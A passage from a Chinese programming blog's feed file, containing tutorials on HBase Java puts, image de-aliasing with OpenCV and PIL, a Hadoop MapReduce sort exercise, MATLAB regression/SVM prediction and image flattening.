class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"address "</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"city"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"guangzhou"</span>)</span>);​    put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"address "</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"street"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"putuolu"</span>)</span>);​    put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"score"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"Java"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"87"</span>)</span>);put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"score"</span>)</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"Hadoop"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"82"</span>)</span>);put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"score"</span>)</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"Math"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"78"</span>)</span>);  String rowkey = <span class="hljs-string">"rowkey_lisi"</span>;  Put put= <span class="hljs-keyword">new</span> <span class="hljs-constructor">Put(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-params">rowKey</span>)</span>);​    put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"address"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"province"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"guangxi"</span>)</span>);​    put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"address "</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"city"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"guilin"</span>)</span>);​    put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"address "</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"street"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"yinglonglu"</span>)</span>);​    put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"score"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"Java"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"85"</span>)</span>);put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"score"</span>)</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"Hadoop"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"80"</span>)</span>);put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"score"</span>)</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"Math"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"90"</span>)</span>);</code></pre></div><p> // 4. 添加数据</p><div class="hljs code-wrapper"><pre><code class="hljs java">table.put(put);table.close();</code></pre></div><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>因吹斯汀</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/weixin_42641909/article/details/89445045" target="_blank" rel="noopener">HBase Java API、连接HBase、创建表、添加数据put、获取数据get、全表扫描scan 06 : 啊策策</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HBase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像去锯齿(降噪、插值、缩略三连)</title>
      <link href="/2020/05/21/%E5%9B%BE%E5%83%8F%E5%8E%BB%E9%94%AF%E9%BD%BF(%E9%99%8D%E5%99%AA+%E6%8F%92%E5%80%BC)/"/>
      <url>/2020/05/21/%E5%9B%BE%E5%83%8F%E5%8E%BB%E9%94%AF%E9%BD%BF(%E9%99%8D%E5%99%AA+%E6%8F%92%E5%80%BC)/</url>
      
        <content type="html"><![CDATA[<p>去除图像的大量锯齿</p><a id="more"></a><p> 图像预处理算法的好坏直接关系到后续图像处理的效果，如图像分割、目标识别、边缘提取等，为了获取高质量的数字图像，很多时候都需要对图像进行降噪处理，尽可能的保持原始信息完整性（即主要特征）的同时，又能够去除信号中无用的信息。 </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705234702375.png" srcset="/img/loading.gif" lazyload="" alt="鲁迅：我没说过"></p><p>如果图片有大量的锯齿难免会显得拙糙，那么这时候降噪也不是一种去除锯齿的好方法。 </p><p>例如：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20230f5dd0c4d285330a78cee1bbe5f.jpg" srcset="/img/loading.gif" lazyload="" alt="带锯齿的原图"></p><p>用该方法去除锯齿之后：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/PIL_Image6.png" srcset="/img/loading.gif" lazyload="" alt="经过高斯模糊之后的图像"></p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> npimg_path = (<span class="hljs-string">"1.png"</span>)<span class="hljs-comment">#获取图片路径</span>img = Image.open(img_path)img_sp = cv2.imread(img_path)sp = img_sp.shape<span class="hljs-comment">#读取图片长宽</span><span class="hljs-comment">#第一次插值、降噪</span>img = img.resize((sp[<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>, sp[<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>), Image.BILINEAR)        <span class="hljs-comment">#三次样条插值，图像长宽放大为2倍</span>img = np.array(img)img_gaosi=cv2.GaussianBlur(img,(<span class="hljs-number">5</span>,<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)<span class="hljs-comment">#高斯降噪，设置高斯核</span>img = Image.fromarray(img_gaosi)<span class="hljs-comment">#转换回数组，以便numpy可读取</span>img = img.resize((sp[<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>, sp[<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>), Image.ANTIALIAS)<span class="hljs-comment">#保持图像品质缩略</span><span class="hljs-comment">#第二次插值、降噪</span>img = img.resize((sp[<span class="hljs-number">1</span>]*<span class="hljs-number">4</span>, sp[<span class="hljs-number">0</span>]*<span class="hljs-number">4</span>), Image.BILINEAR)       <span class="hljs-comment">#三次样条插值，图像长宽放大为4倍</span>img = np.array(img)img_gaosi=cv2.GaussianBlur(img,(<span class="hljs-number">5</span>,<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)img = Image.fromarray(img_gaosi)img = img.resize((sp[<span class="hljs-number">1</span>]*<span class="hljs-number">4</span>, sp[<span class="hljs-number">0</span>]*<span class="hljs-number">4</span>), Image.ANTIALIAS)<span class="hljs-comment">#第三次插值、降噪</span>img = img.resize((sp[<span class="hljs-number">1</span>]*<span class="hljs-number">16</span>, sp[<span class="hljs-number">0</span>]*<span class="hljs-number">16</span>), Image.BILINEAR)<span class="hljs-comment">#三次样条插值，图像长宽放大为16倍</span>img = np.array(img)img_gaosi=cv2.GaussianBlur(img,(<span class="hljs-number">5</span>,<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)img = Image.fromarray(img_gaosi)img = img.resize((sp[<span class="hljs-number">1</span>]*<span class="hljs-number">16</span>, sp[<span class="hljs-number">0</span>]*<span class="hljs-number">16</span>), Image.ANTIALIAS)</code></pre></div><p>注：示例图片来自<a href="https://www.hanspub.org/journal/PaperInformation.aspx?paperID=36204" target="_blank" rel="noopener">《应用数学进展》</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hadoop简单排序</title>
      <link href="/2020/05/15/hadoop%E7%AE%80%E5%8D%95%E6%8E%92%E5%BA%8F/"/>
      <url>/2020/05/15/hadoop%E7%AE%80%E5%8D%95%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>Hadoop课程的简单排序实现</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该文为Hadoop课程的简单排序实现</p><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><p> 简单排序的实现   </p><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>掌握使用MapReduce对数据进行排序的方法。</p><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>以下四个txt文件其各有6个数值</p><p>s1.txt：</p><p>35 12345 21 5 -8 365</p><p>s2.txt:</p><p>38 156 12 6 -2 -10</p><p>s3.txt:</p><p>45 2365 68 -15 -18 -30</p><p>编写一个简单排序的程序，如果将上面三个文件作为输入，则排序后的输出结果为。</p><p>序号 数值 （从小到大）</p><h2 id="实验方案"><a href="#实验方案" class="headerlink" title="实验方案"></a>实验方案</h2><p>在MapReduce过程中就有排序,它的默认排序规则按照key值进行排序的，如果key为封装int的IntWritable类型，那么MapReduce按照数字大小对key排序，如果key为封装为String的Text类型，那么MapReduce按照字典顺序对字符串排序。我们可以使用封装int的IntWritable型数据结构。也就是在map中将读入的数据转化成IntWritable型，然后作为key值输出（value任意）。reduce拿到&lt;key，value-list&gt;之后，将输入的key作为value输出，并根据value-list中元素的个数决定输出的次数。输出的key（即代码中的linenum）是一个全局变量，它统计当前key的位次。</p><p>在示例代码中，需要将其分为Map和Reduce两部分来作修改。在Map部分中，“Text”需要改成“IntWritable”；“itr.nextToken()”需要改成“Integer.parseInt(itr.nextToken())”。在Reduce部分中，“Text”需要改成“IntWritable”；“IntWritable()”需要改成“IntWritable(1)”；for循环语句需要删除；“job.setCombinerClass(IntSumReducer.class);”和“result.set(sum)”这两段语句也需要删除；“word”和“one”则需要对调位置。</p><p>下面是经过修改之后的代码：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.util.StringTokenizer;<span class="hljs-keyword">import</span> org.apache.hadoop.conf.Configuration;<span class="hljs-keyword">import</span> org.apache.hadoop.fs.Path;<span class="hljs-keyword">import</span> org.apache.hadoop.io.IntWritable;<span class="hljs-keyword">import</span> org.apache.hadoop.io.IntWritable;<span class="hljs-keyword">import</span> org.apache.hadoop.mapreduce.Job;<span class="hljs-keyword">import</span> org.apache.hadoop.mapreduce.Mapper;<span class="hljs-keyword">import</span> org.apache.hadoop.mapreduce.Reducer;<span class="hljs-keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;<span class="hljs-keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;<span class="hljs-keyword">import</span> org.apache.hadoop.util.GenericOptionsParser; <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WordCount</span> </span>{ <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TokenizerMapper</span> </span><span class="hljs-class"></span><span class="hljs-class">​    <span class="hljs-keyword">extends</span> <span class="hljs-title">Mapper</span>&lt;<span class="hljs-title">Object</span>, <span class="hljs-title">IntWritable</span>, <span class="hljs-title">IntWritable</span>, <span class="hljs-title">IntWritable</span>&gt;</span>{    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> IntWritable one = <span class="hljs-keyword">new</span> IntWritable(<span class="hljs-number">1</span>);  <span class="hljs-keyword">private</span> IntWritable word = <span class="hljs-keyword">new</span> IntWritable(<span class="hljs-number">1</span>);     <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">map</span><span class="hljs-params">(Object key, IntWritable value, Context context</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">​          )</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException </span>{   StringTokenizer itr = <span class="hljs-keyword">new</span> StringTokenizer(value.toString());   <span class="hljs-keyword">while</span> (itr.hasMoreTokens()) {​    word.set(Integer.parseInt(itr.nextToken()));​    context.write(one, word);   }  } } <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IntSumReducer</span> </span><span class="hljs-class"></span><span class="hljs-class">​    <span class="hljs-keyword">extends</span> <span class="hljs-title">Reducer</span>&lt;<span class="hljs-title">IntWritable</span>,<span class="hljs-title">IntWritable</span>,<span class="hljs-title">IntWritable</span>,<span class="hljs-title">IntWritable</span>&gt; </span>{  <span class="hljs-keyword">private</span> IntWritable result = <span class="hljs-keyword">new</span> IntWritable(<span class="hljs-number">1</span>);  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reduce</span><span class="hljs-params">(IntWritable key, Iterable&lt;IntWritable&gt; values, </span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">​            Context context</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">​            )</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException </span>{   <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;   context.write(key, result);  } } <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{  Configuration conf = <span class="hljs-keyword">new</span> Configuration();  String[] otherArgs = <span class="hljs-keyword">new</span> GenericOptionsParser(conf, args).getRemainingArgs();  <span class="hljs-keyword">if</span> (otherArgs.length &lt; <span class="hljs-number">2</span>) {   System.err.println(<span class="hljs-string">"Usage: wordcount &lt;in&gt; [&lt;in&gt;...] &lt;out&gt;"</span>);   System.exit(<span class="hljs-number">2</span>);  }  Job job = <span class="hljs-keyword">new</span> Job(conf, <span class="hljs-string">"word count"</span>);  job.setJarByClass(WordCount<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;  job.setMapperClass(TokenizerMapper<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;  job.setReducerClass(IntSumReducer<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;  job.setOutputKeyClass(IntWritable<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;  job.setOutputValueClass(IntWritable<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; otherArgs.length - <span class="hljs-number">1</span>; ++i) {   FileInputFormat.addInputPath(job, <span class="hljs-keyword">new</span> Path(otherArgs[i]));  }  FileOutputFormat.setOutputPath(job,   <span class="hljs-keyword">new</span> Path(otherArgs[otherArgs.length - <span class="hljs-number">1</span>]));  System.exit(job.waitForCompletion(<span class="hljs-keyword">true</span>) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>); }}</code></pre></div><p>在输入代码前，需要新建MapReduce项目并新建一个类，类名需要与代码相对应，即是WordCount。输入完上述代码过后，需要修改这个类的输入输出路径，即是在argument窗口中，将路径设置为用于存储需要排序的数据的文件。然后再运行代码，即可得到实验题目中所给出的排序结果（如“三、结论”中的插图所示）。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>本次实验的目的与要求均已达成。在实验中，可以熟练利用现成的虚拟机资源在VM上创建Master虚拟机及其slave虚拟机集群。基本能够运用MapReduce将数据从三个不同文件中提取出来并按照其自身的key值进行有小到大的排序，得到题目中给出的实验结果（下图即是代码运行后的到的结果）</p><p>​         <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image002.png" srcset="/img/loading.gif" lazyload="" alt="Hadoop简单排序结果">  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的三种机器学习预测方法</title>
      <link href="/2020/05/06/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%89%E7%A7%8D%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E9%A2%84%E6%B5%8B%E6%96%B9%E6%B3%95/"/>
      <url>/2020/05/06/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%89%E7%A7%8D%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E9%A2%84%E6%B5%8B%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>三种常用的机器学习预测方法</p><a id="more"></a><p>以下代码统一为读入xlsx文件，其中第一列为因变量，其余列为自变量,每一行代表一个样本</p><h2 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h2><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">%读取数据</span>[X,TXT,RAW]=xlsread(<span class="hljs-string">'train_element.xlsx'</span>);y=X(:,<span class="hljs-number">1</span>);        <span class="hljs-comment">%第一列为y值</span>X(:,<span class="hljs-number">1</span>)=[<span class="hljs-number">1</span>];      <span class="hljs-comment">%将第一列数值变为1</span>[b,bint,r,rint,stats]=regress(y,X);b   <span class="hljs-comment">%回归系数，第一个是常数项</span><span class="hljs-comment">%测试</span>[TX,TXT,RAW]=xlsread(<span class="hljs-string">'test_element.xlsx'</span>);TY_num = <span class="hljs-built_in">size</span>(TX,<span class="hljs-number">1</span>);TY = [<span class="hljs-number">1</span>:TY_num];TY(<span class="hljs-number">1</span>,:) = b(<span class="hljs-number">1</span>);<span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-number">30</span>            <span class="hljs-comment">%测试数据30行</span>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:<span class="hljs-number">21</span>       <span class="hljs-comment">%每一行21个自变量</span>        TY(<span class="hljs-built_in">i</span>) = TX(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>+<span class="hljs-number">1</span>) * b(<span class="hljs-built_in">j</span>+<span class="hljs-number">1</span>)+TY(<span class="hljs-built_in">i</span>); <span class="hljs-comment">% TX第一个是1，故j+1;b第一个是常数项系数，故j+1</span>      <span class="hljs-keyword">end</span>  <span class="hljs-keyword">end</span><span class="hljs-built_in">hold</span> on<span class="hljs-built_in">plot</span>(TY)<span class="hljs-built_in">plot</span>(TX(:,<span class="hljs-number">1</span>))<span class="hljs-built_in">legend</span>(<span class="hljs-string">'预测值'</span>,<span class="hljs-string">'真实值'</span>);TY</code></pre></div><h2 id="BP网络"><a href="#BP网络" class="headerlink" title="BP网络"></a>BP网络</h2><p>在应用程序处打开<code>Neural Net Fitting</code>训练神经网络模型</p><p>参见 (如何利用matlab做BP神经网络分析-利用matlab神经网络工具箱)[ <a href="https://blog.csdn.net/ljyljyok/article/details/81362465" target="_blank" rel="noopener">https://blog.csdn.net/ljyljyok/article/details/81362465</a> ]</p><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[ ]</span> = <span class="hljs-title">BP_Forecast</span><span class="hljs-params">( X,TX )</span></span>load BP_202054_14.mat         <span class="hljs-comment">%导入网络模型</span>X = X';     <span class="hljs-comment">%转置</span>Y=sim(net,X);         <span class="hljs-comment">%使用训练好的BP网络模型预测</span></code></pre></div><h2 id="SVM"><a href="#SVM" class="headerlink" title="SVM"></a>SVM</h2><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[ ]</span> = <span class="hljs-title">SVM_R</span><span class="hljs-params">( X,TX )</span></span><span class="hljs-comment">%load svm_r%若没有数据则读取模型</span><span class="hljs-comment">%[X,TXT,RAW]=xlsread('train_element.xlsx');      %读取训练数据</span>target = X(:,<span class="hljs-number">1</span>);X(:,<span class="hljs-number">1</span>) = [];train = X;<span class="hljs-comment">%% 最优参数选择</span>mse = <span class="hljs-number">10</span>^<span class="hljs-number">7</span>;<span class="hljs-keyword">for</span> log2c = <span class="hljs-number">-10</span>:<span class="hljs-number">0.5</span>:<span class="hljs-number">3</span>    <span class="hljs-keyword">for</span> log2g = <span class="hljs-number">-10</span>:<span class="hljs-number">0.5</span>:<span class="hljs-number">3</span>        <span class="hljs-comment">% -v 交叉验证参数：在训练的时候需要，测试的时候不需要，否则出错</span>        options = [<span class="hljs-string">'-v 3 -c '</span>, num2str(<span class="hljs-number">2</span>^log2c), <span class="hljs-string">' -g '</span>, num2str(<span class="hljs-number">2</span>^log2g) , <span class="hljs-string">' -s 3 -p 0.4 -t 3'</span>];        cv = svmtrain(target,train,options);        <span class="hljs-keyword">if</span> (cv &lt; mse)            mse = cv; bestc = <span class="hljs-number">2</span>^log2c; bestg = <span class="hljs-number">2</span>^log2g;        <span class="hljs-keyword">end</span>    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-comment">%%  训练</span>options = [<span class="hljs-string">'-c '</span>, num2str(<span class="hljs-number">2</span>^bestc), <span class="hljs-string">' -g '</span>, num2str(<span class="hljs-number">2</span>^bestg) , <span class="hljs-string">' -s 3 -p 0.4 -n 0.1'</span>];model = svmtrain(target,train,options)<span class="hljs-comment">% model</span><span class="hljs-comment">% 利用建立的模型看其在训练集合上的回归效果</span>[predict_p,accuracy,dv] = svmpredict(target,train,model);<span class="hljs-built_in">figure</span><span class="hljs-built_in">plot</span>(target,<span class="hljs-string">'o'</span>)<span class="hljs-built_in">hold</span> on<span class="hljs-built_in">plot</span>(predict_p,<span class="hljs-string">'.'</span>)test_target = TX(:,<span class="hljs-number">1</span>); <span class="hljs-comment">%这个随便给不影响预测的结果，但是会基于这个值计算预测准确率</span>TX(:,<span class="hljs-number">1</span>)=[];test_train = TX;<span class="hljs-keyword">global</span> dv_t[predict_t,accuracy_t,dv_t] = svmpredict(test_target,test_train,model);<span class="hljs-built_in">hold</span> on<span class="hljs-built_in">plot</span>(predict_t,<span class="hljs-string">'*'</span>)<span class="hljs-built_in">legend</span>(<span class="hljs-string">'原始数据'</span>,<span class="hljs-string">'回归数据'</span>,<span class="hljs-string">'新数据预测'</span>);<span class="hljs-comment">%直观对比</span><span class="hljs-comment">%hold on</span><span class="hljs-comment">%plot(TY)</span><span class="hljs-comment">%plot(dv_t)</span><span class="hljs-comment">%legend('原始数据','新数据预测');</span><span class="hljs-built_in">hold</span> on<span class="hljs-built_in">plot</span>(test_target)<span class="hljs-built_in">plot</span>(dv_t)xlswrite(<span class="hljs-string">'预测结果.xlsx'</span>,dv_t)<span class="hljs-built_in">legend</span>(<span class="hljs-string">'原始数据'</span>,<span class="hljs-string">'新数据预测'</span>);</code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像一维化</title>
      <link href="/2020/05/06/%E5%9B%BE%E5%83%8F%E4%B8%80%E7%BB%B4%E5%BA%A6%E5%8C%96/"/>
      <url>/2020/05/06/%E5%9B%BE%E5%83%8F%E4%B8%80%E7%BB%B4%E5%BA%A6%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>将图像拉伸成向量</p><a id="more"></a><h2 id="灰度图像一维化"><a href="#灰度图像一维化" class="headerlink" title="灰度图像一维化"></a>灰度图像一维化</h2><p><del>众所周知</del> 灰度图像是由元素数值在 [0,255] 范围内的矩阵构成的，因此可以将一个n<em>m的矩阵（分辨率n</em>m）变成一个向量，即图像一维化。<br>常见的彩色图像由RGB三个通道组成（即有3个m*n的矩阵），因而操作其实也是类似的，三个通道分别处理再叠加即可。</p><h3 id="直接拉伸"><a href="#直接拉伸" class="headerlink" title="直接拉伸"></a>直接拉伸</h3><p>在图像处理中，有时候需要将图像拉抻成向量进行处理。</p><div class="hljs code-wrapper"><pre><code class="hljs matlab">file_path = <span class="hljs-string">'D:\Documents\Project\clustering\Semi_Supervised\data\COVID_CT\CT_COVID\';% 需要一维化图像的文件夹路径 </span><span class="hljs-string">img_path_list = dir(strcat(file_path,'</span>*.png'));<span class="hljs-comment">%获取该文件夹中所有jpeg格式的图像</span>img_num = <span class="hljs-built_in">length</span>(img_path_list);<span class="hljs-comment">%获取图像总数量</span>data=<span class="hljs-built_in">zeros</span>(img_num,<span class="hljs-number">600</span>);             <span class="hljs-comment">%创建零矩阵，大小为img_num*600，600自己按需修改</span>I=cell(<span class="hljs-number">1</span>,img_num);<span class="hljs-keyword">if</span> img_num &gt; <span class="hljs-number">0</span> <span class="hljs-comment">%有满足条件的图像</span>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:img_num <span class="hljs-comment">%逐一读取图像 </span>                 image_name = img_path_list(<span 